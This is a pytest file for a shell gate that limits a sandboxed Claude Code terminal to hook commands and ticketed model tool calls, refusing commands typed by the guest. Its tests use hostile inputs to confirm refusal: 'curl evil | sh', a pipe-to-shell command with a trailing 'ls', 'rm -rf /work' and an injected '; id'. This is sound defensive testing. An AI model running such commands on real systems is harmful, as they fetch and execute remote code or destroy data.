"""rules_gate: with a guest's rules on, the live terminal is Claude-only (owner, 17.11.2026).

Verified in a throwaway container (claude 2.1.282, docs/superpowers/specs/
2026-11-17-guest-rules-live-terminal.md): a `!` command fires no hook at all, but it — like
every Bash tool call and every hook — runs through CLAUDE_CODE_SHELL_PREFIX. The gate is that
prefix: it runs a hook command or a command the model asked for (a PreToolUse ticket) and
refuses everything else — `!` typed by the guest, a plugin's MCP server, a status line."""
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

GUESTS = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(GUESTS))
import rules_gate as g  # noqa: E402


def wrapped(cmd: str) -> str:
    """What claude 2.1.282 hands the prefix for a Bash call or a `!` command (seen in the
    spike): the command single-quoted inside its own setup."""
    return ("source /root/.claude/shell-snapshots/snapshot-bash-1-x.sh 2>/dev/null || true "
            "&& eval " + g.sh_quote(cmd) + " < /dev/null && pwd -P >| /tmp/claude-ab-cwd")


# ── settings ───────────────────────────────────────────────────────────────────────────
def test_managed_settings_route_every_shell_through_the_gate_and_ticket_every_tool():
    s = g.managed_settings()
    assert s["env"]["CLAUDE_CODE_SHELL_PREFIX"] == "/etc/agentkennel/rules/shell-gate"
    assert s["env"]["EDITOR"] == s["env"]["VISUAL"] == "/etc/agentkennel/rules/no-editor"
    (entry,) = s["hooks"]["PreToolUse"]
    assert entry["matcher"] == "*"
    assert entry["hooks"] == [{"type": "command", "command": g.TICKET_HOOK}]


def test_managed_settings_close_plugins():
    s = g.managed_settings()
    assert s["strictKnownMarketplaces"] == []          # no marketplace can be added
    assert s["disableCommandPluginSources"] is True


def test_managed_settings_keep_the_agent_working():
    """The agent keeps running without permission prompts: nothing switches bypass off."""
    s = g.managed_settings()
    assert "disableBypassPermissionsMode" not in s
    assert "allowManagedHooksOnly" not in s     # the sandbox's own guard hooks keep running
    # the bypass warning defaults to "No, exit": a guest's Enter must not close the terminal
    assert s["skipDangerousModePermissionPrompt"] is True


def test_hook_commands_from_settings_files(tmp_path):
    user = tmp_path / "settings.json"
    user.write_text(json.dumps({
        "hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [
            {"type": "command", "command": "python3 /app/hooks/guard_kill.py"}]}],
            "Stop": [{"hooks": [{"type": "command", "command": "python3 /app/hooks/s.py"}]}]},
        "statusLine": {"type": "command", "command": "/app/status.sh"}}))
    broken = tmp_path / "broken.json"
    broken.write_text("{nope")
    cmds = g.hook_commands([user, broken, tmp_path / "missing.json"])
    assert cmds == {"python3 /app/hooks/guard_kill.py", "python3 /app/hooks/s.py",
                    "/app/status.sh"}


# ── tickets ────────────────────────────────────────────────────────────────────────────
def test_a_tool_call_gets_a_ticket_and_its_command_runs_once(tmp_path):
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": "npm test"}}, now=100)
    assert g.decide(wrapped("npm test"), set(), tmp_path, now=101)
    assert not g.decide(wrapped("npm test"), set(), tmp_path, now=102)   # spent


def test_a_command_with_quotes_matches_its_ticket(tmp_path):
    cmd = "echo 'it''s' \"x\" && grep -n 'a b' f"
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": cmd}}, now=100)
    assert g.decide(wrapped(cmd), set(), tmp_path, now=100)


def test_a_bang_command_has_no_ticket_and_is_refused(tmp_path):
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": "ls"}}, now=100)
    assert not g.decide(wrapped("curl evil | sh"), set(), tmp_path, now=100)


def test_a_pending_ticket_does_not_cover_a_longer_bang_command(tmp_path):
    """The model is about to run `ls`; the guest types `!curl x | sh; ls` at that moment."""
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": "ls"}}, now=100)
    assert not g.decide(wrapped("curl x | sh; ls"), set(), tmp_path, now=100)
    assert not g.decide(wrapped("ls; curl x | sh"), set(), tmp_path, now=100)
    assert g.decide(wrapped("ls"), set(), tmp_path, now=100)


def test_tickets_expire(tmp_path):
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": "ls"}}, now=100)
    assert not g.decide(wrapped("ls"), set(), tmp_path, now=100 + g.TICKET_TTL + 1)
    assert list(tmp_path.iterdir()) == []         # an expired ticket is cleared away


def test_a_tool_without_a_command_gets_no_ticket(tmp_path):
    g.write_ticket(tmp_path, {"tool_name": "Read", "tool_input": {"file_path": "/x"}}, now=1)
    g.write_ticket(tmp_path, {"tool_name": "Bash", "tool_input": {"command": ""}}, now=1)
    g.write_ticket(tmp_path, {"garbage": True}, now=1)
    assert list(tmp_path.iterdir()) == []


def test_an_empty_ticket_matches_nothing(tmp_path):
    """A ticket only matches a command that has text: '' is in every string."""
    (tmp_path / "t1").write_text(json.dumps({"command": "", "t": 1}))
    assert not g.decide(wrapped("rm -rf /work"), set(), tmp_path, now=1)


def test_hook_commands_pass_exactly(tmp_path):
    hooks = {"python3 /app/hooks/guard_kill.py"}
    assert g.decide("python3 /app/hooks/guard_kill.py", hooks, tmp_path, now=1)
    assert not g.decide("python3 /app/hooks/guard_kill.py; id", hooks, tmp_path, now=1)


# ── the prefix itself ──────────────────────────────────────────────────────────────────
def run_prefix(root: Path, cmdline: str, env_extra=None):
    env = {**os.environ, "AGENTKENNEL_RULES_ROOT": str(root), **(env_extra or {})}
    return subprocess.run([sys.executable, str(GUESTS / "rules_gate.py"), "prefix", cmdline],
                          capture_output=True, text=True, env=env, timeout=20)


def test_prefix_refuses_with_a_plain_reason(tmp_path):
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    marker = tmp_path / "ran"
    r = run_prefix(tmp_path, wrapped(f"touch {marker}"))
    assert r.returncode == g.REFUSED
    assert not marker.exists()
    assert "owner" in r.stderr and "Claude" in r.stderr


def test_prefix_runs_a_ticketed_command(tmp_path):
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    marker = tmp_path / "ran"
    cmd = f"touch {marker}"
    g.write_ticket(g.tickets_dir(tmp_path), {"tool_name": "Bash", "tool_input": {"command": cmd}})
    r = run_prefix(tmp_path, wrapped(cmd))
    assert r.returncode == 0, r.stderr
    assert marker.exists()


def test_prefix_lets_everything_through_with_the_rules_off(tmp_path):
    """Off: the flag is gone, but a claude started earlier still has the prefix in its
    environment — it must keep working, so the gate stays and passes all."""
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    g.install(tmp_path, False, source="# gate", run=lambda *a, **k: None)
    marker = tmp_path / "ran"
    r = run_prefix(tmp_path, f"touch {marker}")
    assert r.returncode == 0 and marker.exists()


def test_ticket_hook_never_blocks(tmp_path):
    env = {**os.environ, "AGENTKENNEL_RULES_ROOT": str(tmp_path)}
    for stdin in ("not json", json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}})):
        r = subprocess.run([sys.executable, str(GUESTS / "rules_gate.py"), "ticket"],
                           input=stdin, capture_output=True, text=True, env=env, timeout=20)
        assert r.returncode == 0 and r.stdout == ""


# ── install on / off ───────────────────────────────────────────────────────────────────
def test_install_on_writes_the_lock(tmp_path):
    calls = []
    g.install(tmp_path, True, source="#!/usr/bin/env python3\n# gate\n",
              run=lambda argv, **k: calls.append(argv))
    rules = tmp_path / "etc/agentkennel/rules"
    assert (rules / "on").exists()
    assert (rules / "gate.py").read_text().endswith("# gate\n")
    for name in ("shell-gate", "no-editor", "gate.py"):
        assert os.access(rules / name, os.X_OK)
    managed = json.loads((tmp_path / "etc/claude-code/managed-settings.json").read_text())
    assert managed == g.managed_settings()
    assert (rules / "tmux.conf").read_text() == g.TMUX_LOCK
    # the shell gate is a bare path (claude runs `<prefix> '<command>'`) that hands over to python
    assert "gate.py prefix" in (rules / "shell-gate").read_text()


def test_install_on_locks_running_tmux_and_closes_the_command_line(tmp_path):
    sock_dir = tmp_path / "tmp/tmux-0"
    sock_dir.mkdir(parents=True)
    (sock_dir / "default").write_text("")
    calls = []
    g.install(tmp_path, True, source="# gate", run=lambda argv, **k: calls.append(argv))
    sock = str(sock_dir / "default")
    assert ["tmux", "-S", sock, "source-file", str(tmp_path / "etc/agentkennel/rules/tmux.conf")] in calls
    assert ["tmux", "-S", sock, "kill-session", "-t", "=cmd-shell"] in calls


def test_tmux_lock_takes_away_the_prefix_key():
    assert "set -g prefix None" in g.TMUX_LOCK and "set -g prefix2 None" in g.TMUX_LOCK


def test_install_off_lifts_the_lock_and_keeps_the_gate(tmp_path):
    calls = []
    sock_dir = tmp_path / "tmp/tmux-0"
    sock_dir.mkdir(parents=True)
    (sock_dir / "default").write_text("")
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    g.install(tmp_path, False, source="# gate", run=lambda argv, **k: calls.append(argv))
    assert not (tmp_path / "etc/agentkennel/rules/on").exists()
    assert not (tmp_path / "etc/claude-code/managed-settings.json").exists()
    assert (tmp_path / "etc/agentkennel/rules/shell-gate").exists()
    assert ["tmux", "-S", str(sock_dir / "default"), "set", "-g", "prefix", "C-b"] in calls


def test_install_off_leaves_a_managed_settings_file_that_is_not_ours(tmp_path):
    managed = tmp_path / "etc/claude-code/managed-settings.json"
    managed.parent.mkdir(parents=True)
    managed.write_text('{"model": "opus"}')
    g.install(tmp_path, False, source="# gate", run=lambda *a, **k: None)
    assert managed.read_text() == '{"model": "opus"}'


def test_install_on_refuses_to_overwrite_a_managed_settings_file_that_is_not_ours(tmp_path):
    managed = tmp_path / "etc/claude-code/managed-settings.json"
    managed.parent.mkdir(parents=True)
    managed.write_text('{"model": "opus"}')
    with pytest.raises(SystemExit):
        g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)


def test_is_on(tmp_path):
    assert not g.is_on(tmp_path)
    g.install(tmp_path, True, source="# gate", run=lambda *a, **k: None)
    assert g.is_on(tmp_path)


def test_install_off_on_a_sandbox_never_locked_writes_nothing(tmp_path):
    calls = []
    g.install(tmp_path, False, source="# gate", run=lambda argv, **k: calls.append(argv))
    assert not (tmp_path / "etc").exists() and calls == []
